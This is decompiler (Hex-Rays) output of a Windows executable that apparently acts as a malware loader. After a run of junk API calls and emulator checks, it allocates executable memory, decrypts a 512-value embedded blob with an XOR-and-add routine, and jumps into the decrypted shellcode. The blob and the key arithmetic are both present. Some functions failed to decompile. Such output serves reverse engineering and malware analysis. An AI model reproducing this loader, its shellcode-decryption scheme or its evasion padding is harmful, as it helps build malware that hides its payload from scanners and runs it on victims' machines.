/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// __int64 __stdcall CreateToolbar(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __cdecl _p__osver(_DWORD); weak
unsigned int sub_4097E0();
// HANDLE __usercall sub_409878@<eax>(int@<ebx>, int@<edi>, int@<esi>, HHOOK);
int start();

//-------------------------------------------------------------------------
// Data declarations

// extern DWORD (__stdcall *GetFileAttributesW)(LPCWSTR lpFileName);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern unsigned int (__cdecl *rotr)(unsigned int Value, int Shift);
// extern FILE *(__cdecl *_p__iob)();
// extern HDC (__stdcall *GetWindowDC)(HWND hWnd);
// extern HANDLE (__stdcall *GetPropA)(HWND hWnd, LPCSTR lpString);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern BOOL (__stdcall *UnhookWindowsHookEx)(HHOOK hhk);
// extern BOOL (__stdcall *IsWindow)(HWND hWnd);
int dword_40E900[512] =
{
  2023610064,
  760615598,
  900027813,
  262565671,
  1899555362,
  -765446566,
  1144127205,
  -1078900120,
  -751419849,
  -1019765351,
  617873049,
  -1988237528,
  -375590361,
  -1001105944,
  -1661921171,
  1052241604,
  -1904083361,
  -191428562,
  1561931362,
  -323931653,
  543944979,
  -1209137494,
  754449106,
  1949898144,
  -273276615,
  2054166781,
  1390682089,
  628551676,
  170058265,
  1758153589,
  -861691523,
  -1364940,
  768736431,
  555297486,
  -1220510863,
  646433216,
  -1002417821,
  -1442145477,
  1932587329,
  -1802206340,
  1216073735,
  -1548872778,
  1521784012,
  223411528,
  -292018213,
  582973506,
  67555021,
  -1150412956,
  -553327233,
  1355559422,
  1949532289,
  1151872528,
  1732200263,
  962304558,
  1792039509,
  -837344020,
  980597335,
  1179265329,
  455105145,
  -1132207464,
  810237227,
  441762450,
  -767848279,
  -1412012292,
  -2101969509,
  -47994722,
  275568517,
  -163332680,
  1773282833,
  1388346464,
  -917403321,
  -262483794,
  159763533,
  2045920636,
  1131310499,
  -2013636683,
  -2129199066,
  -1897585073,
  1095530285,
  -1533819516,
  1473974303,
  -386035810,
  -410625438,
  -1172521104,
  -916001121,
  -208029078,
  -207176279,
  -876455551,
  1436654719,
  -1926775921,
  -1910914391,
  1418891202,
  -1207833487,
  -959910926,
  990221112,
  469074528,
  -364528785,
  -1223318056,
  1803557274,
  -1940046645,
  1298624519,
  568164625,
  1549689221,
  309160332,
  -1589007120,
  -1568192111,
  -1363125123,
  -466847067,
  -655492392,
  -1791568670,
  845276695,
  491796383,
  1387591059,
  1502893655,
  1798764302,
  336312256,
  940954362,
  -1447269131,
  1145441417,
  -150111199,
  -1539031588,
  912995410,
  968224628,
  596679792,
  -631073677,
  156105199,
  -1351975198,
  -1067346424,
  -627876368,
  608740915,
  2134512949,
  288969440,
  -400301878,
  -2085979768,
  -827112868,
  2111901916,
  1864918827,
  -946863105,
  -1784504103,
  -1040242708,
  -1987475172,
  1480998347,
  1937301081,
  -638198821,
  917044012,
  540002970,
  -89008538,
  977810837,
  -1452651949,
  714114998,
  268538576,
  1564648748,
  -1703935369,
  -943697489,
  334376969,
  -634163339,
  -1754440568,
  1465786255,
  1330359448,
  -2051176507,
  -1298754761,
  1782604878,
  -39300522,
  -968193223,
  343295750,
  -1840603794,
  -754911411,
  1754759893,
  -2145211513,
  -215913319,
  612779432,
  2038225725,
  -2097781093,
  197854886,
  29015864,
  -1437382635,
  1800134838,
  294097361,
  -976818423,
  -1497016435,
  -1059195755,
  -1953366882,
  -988576464,
  1564440428,
  -1962954338,
  -2033250289,
  -343521540,
  1347134595,
  -584106069,
  368163119,
  -1188479446,
  -1443170651,
  -86871784,
  1142195059,
  975852381,
  -1763100392,
  1085856130,
  553930119,
  -569921493,
  1524746547,
  359740764,
  1546823211,
  1132149572,
  -766418509,
  140871575,
  -2086244572,
  170519282,
  881770156,
  592071866,
  -999410271,
  911540245,
  -182779539,
  -1356745930,
  195784944,
  673955318,
  -354096113,
  1299635986,
  -461475825,
  -605701650,
  -926258116,
  1942583370,
  1100998133,
  220048564,
  -1428966523,
  -21568511,
  1211907905,
  1075714661,
  367436165,
  -1537112861,
  635400506,
  -374233342,
  2104999335,
  445065748,
  1350587074,
  -772915319,
  -1599733813,
  -145912728,
  1367098069,
  2031738069,
  -692766556,
  -1935109258,
  2004740158,
  -1480196415,
  2082282759,
  1371342384,
  -532273126,
  1394323222,
  1283088173,
  -1771467157,
  -693576154,
  136870868,
  1238694284,
  1048553962,
  -1068184747,
  -463913068,
  2062505241,
  -1847281910,
  -42864022,
  -1396911708,
  954895732,
  962260298,
  -1810835683,
  1843336558,
  1855911840,
  1676671914,
  -1692695274,
  570353266,
  679993765,
  944181880,
  -1808508426,
  2048121544,
  -2011129969,
  -881008408,
  -1744075810,
  236948454,
  1754138729,
  1257112986,
  1488830903,
  1392059473,
  352787004,
  1974645076,
  -862216133,
  -243447980,
  -1795501951,
  212122380,
  2018959154,
  64627572,
  705795530,
  -544207130,
  1571311425,
  1785886160,
  -1032438855,
  343727056,
  -2005840793,
  322129544,
  -417196932,
  428672388,
  -1653307722,
  -2081145198,
  587452305,
  1141284063,
  -246933438,
  -545096686,
  -183917709,
  520075574,
  -369814711,
  -979228719,
  1955471773,
  819732855,
  -95174197,
  -1032203253,
  -265582440,
  -807597491,
  440867881,
  344337688,
  -131223824,
  -638463281,
  -1452454509,
  252635283,
  1114172384,
  1687600085,
  601763041,
  -2133739664,
  -566034456,
  1439897098,
  33673869,
  -1256862036,
  -1292340452,
  1305760046,
  904630590,
  1804561753,
  1239785768,
  -44216975,
  -800182318,
  -1849735288,
  122232319,
  -47410886,
  -620745161,
  -67190815,
  1412235540,
  -1813124311,
  -1069748390,
  182960506,
  -1066735667,
  -820750425,
  2078529881,
  684410465,
  113502841,
  -181439925,
  -1145353767,
  245354960,
  -1236617201,
  1681451435,
  1332181843,
  1629969929,
  1788467321,
  878628816,
  -934525626,
  1816323528,
  356383595,
  -1333807077,
  825036406,
  1313874724,
  397406611,
  199527006,
  506030081,
  -1860471022,
  580729173,
  -726168758,
  324727965,
  -590532728,
  490985481,
  -254603405,
  -1291099645,
  750619612,
  -1926068024,
  1455250368,
  425829952,
  1893714236,
  -759680509,
  542585275,
  -1486606597,
  1371789588,
  827922960,
  20674456,
  1157233841,
  -1729464219,
  -702061600,
  178885674,
  1213600754,
  -1094153112,
  1437919526,
  167444974,
  -500157589,
  74782157,
  693399496,
  -1607235522,
  963434213,
  -1687430748,
  -314250427,
  -1880549282,
  -1746335534,
  1683570528,
  -1499812048,
  1581533604,
  -1589466569,
  1733039226,
  -2121907068,
  -384862460,
  1538415001,
  -1464244383,
  -1972584665,
  1836402894,
  1306147546,
  1509798672,
  574591710,
  -770019520,
  553350795,
  1605850704,
  856855616,
  -204710550,
  -444881177,
  225509473,
  -470475495,
  -1739010457,
  1172047746,
  -543189948,
  1613065555,
  -1963742178,
  2093438271,
  619948013,
  -1829277104,
  -151672888,
  438273621,
  -1734128896,
  282784315,
  -1040758698,
  -112866365,
  -86788196,
  -207871382,
  -1169759628,
  -2000283237,
  -1166511720,
  -1850166024,
  -1231254875,
  -1876669393,
  1860704966,
  1027868476,
  -1890467638,
  642508554,
  -1707593764,
  -1536264280,
  -285178138,
  -1107639027,
  1090271020,
  -406568943,
  -1483741105,
  -2128211246,
  -932843186,
  -181875471,
  -1936215554,
  -1696976986,
  507796466,
  1832133906,
  193406582,
  -1259099706,
  -922909909,
  -82941271,
  -1430111671,
  1596195854,
  -385377034,
  773370820,
  551154271,
  1240967814,
  -1660692818,
  731909825,
  -67611677,
  1933056626,
  1170548568,
  -878655867,
  22634524,
  -379138594,
  -811786982,
  2086594297,
  676091815,
  1071583377,
  -628589172,
  -344079064,
  -1112270009,
  1916235586,
  604436900,
  -2056914944,
  -1437348325,
  169521792,
  -1468735832,
  -1002873131,
  -441050250,
  375094563,
  49733827,
  833983829,
  -1689061232,
  -1849992387,
  1819706773,
  831261857,
  136749015,
  575843586,
  1669200969,
  107650245,
  -1268714873,
  146668666,
  776011931,
  1492102725
}; // weak
int dword_40FBC8[12] =
{
  -2021068189,
  1933557314,
  436256953,
  153719393,
  13251380,
  -1678098009,
  -1199595233,
  749464649,
  2038052856,
  -1735150985,
  -860180808,
  1474881412
}; // weak


//----- (004097E0) --------------------------------------------------------
unsigned int sub_4097E0()
{
  __int16 FileName[56]; // [esp+308h] [ebp-70h] BYREF

  _p__iob();
  GetPropA((HWND)1, (LPCSTR)1);
  IsWindow(0);
  GetFileAttributesW((LPCWSTR)FileName);
  GetDC(0);
  return rotr(3u, 7);
}
// 4097E0: using guessed type WCHAR FileName[56];

//----- (00409878) --------------------------------------------------------
HANDLE __usercall sub_409878@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HHOOK a4)
{
  unsigned int v4; // eax
  int v5; // edx
  int v6; // ecx
  int *v7; // ecx
  int *v8; // edi
  int v9; // ebx
  int v11; // [esp+0h] [ebp-404h]
  int v12; // [esp+20h] [ebp-3E4h]
  unsigned int v13; // [esp+84h] [ebp-380h]
  int v14; // [esp+88h] [ebp-37Ch]
  int v15; // [esp+8Ch] [ebp-378h]
  int v18; // [esp+A4h] [ebp-360h] BYREF
  int v19; // [esp+33Ch] [ebp-C8h]
  struct HWND__ hWnd; // [esp+39Ch] [ebp-68h] BYREF
  int *v21; // [esp+3A0h] [ebp-64h]
  int savedregs; // [esp+404h] [ebp+0h] BYREF

  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  _p__iob();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  CreateToolbar(0, 0, 0, 0, 0, 0, 0, 0);
  if ( v12 != 30 )
    return (HANDLE)((BOOL (__stdcall *)(HHOOK))((char *)&UnhookWindowsHookEx + 3))(a4);
  sub_4097E0();
  sub_4097E0();
  v4 = sub_4097E0();
  v15 = v6;
  v14 = v5;
  v13 = v4;
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  v21 = (int *)VirtualAlloc(0, 0x8880u, 0x1000u, 0x40u);
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  sub_4097E0();
  CreateToolbar(0, 0, 0, 0, 0, 0, 0, 0);
  if ( v11 != 30 )
    JUMPOUT(0x4097F5);
  v7 = dword_40E900;
  v8 = v21;
  v19 = -1933147382;
  do
  {
    v9 = v19 ^ ((v19 ^ ((v19 ^ (*v7 - 1943297980)) + 623365910)) + 1792443301);
    v19 = v19 - 1201291906 + 858878197;
    *v8 = v9;
    ++v7;
    ++v8;
  }
  while ( v7 != dword_40FBC8 );
  ((void (__stdcall *)(unsigned int, int, int, int, int *, int *, int, int))v21)(
    v13,
    v14,
    v15,
    a1,
    &v18,
    &savedregs,
    a2,
    a3);
  GetWindowDC(&hWnd);
  return GetPropA(0, (LPCSTR)1);
}
// 4099D4: control flows out of bounds to 4097F5
// 409914: variable 'v12' is possibly undefined
// 40992E: variable 'v6' is possibly undefined
// 40992E: variable 'v5' is possibly undefined
// 4099D4: variable 'v11' is possibly undefined
// 4091A4: using guessed type __int64 __stdcall CreateToolbar(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40E900: using guessed type int dword_40E900[512];
// 40FBC8: using guessed type int dword_40FBC8[12];

//----- (00409DFF) --------------------------------------------------------
#error "409E1B: call analysis failed (funcsize=19)"

// nfuncs=3 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 3 function(s)"
